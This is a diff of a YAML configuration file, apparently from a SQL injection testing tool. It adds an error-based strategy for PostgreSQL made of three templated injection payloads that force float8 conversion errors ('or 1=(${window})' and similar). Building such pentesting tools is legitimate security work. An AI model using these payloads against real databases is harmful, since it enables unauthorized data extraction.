@@ -168,3 +168,22 @@ strategy:
   modeAnd: and
   modeOr: or
   blind: ${binary.mode} ${test}
+
+ error:
+  method:
+
+   - name: float8:or
+     query: |
+      /* ERROR: Could not convert "<sqli>" to a float8 */
+      or 1=(${window})
+     capacity: 2028
+
+   - name: float8:and
+     query: |
+      and 1=(${window})
+     capacity: 2028
+
+   - name: float8:none
+     query: |
+      1+(${window})
+     capacity: 2028
